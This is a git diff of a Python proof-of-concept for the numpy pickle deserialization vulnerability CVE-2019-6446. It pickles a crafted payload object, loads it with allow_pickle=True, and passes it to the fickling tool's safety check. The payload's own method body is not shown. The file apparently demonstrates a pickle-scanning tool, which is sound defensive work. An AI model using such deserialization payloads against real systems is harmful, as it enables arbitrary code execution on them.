@@ -1,5 +1,3 @@
-# This PoC has been adapted from https://snyk.io/vuln/SNYK-PYTHON-NUMPY-73513 (CVE-2019-6446)
-
 import numpy
 import os
 import pickle
@@ -16,19 +14,17 @@ class Test(object):
 
 payload = Test()
 
-print("\n\nWithout fickling\n\n")
-
 with open("a-file.pickle", "wb") as f:
     pickle.dump(payload, f)
 
-# The original PoC used an earlier version where allow_pickle was True by default
 numpy.load("a-file.pickle", allow_pickle=True)
-
-print("\n\nWith fickling\n\n")
 
 fickled_payload = Pickled.load(pickle.dumps(payload))
 
-print("\n\nHow likely is this to be safe?\n\n")
-safety = fickled_payload.check_safety
+safety = fickled_payload.is_likely_safe
+
+#print(dir(safety))
+
+#print(safety.severity)
 
 print(safety)
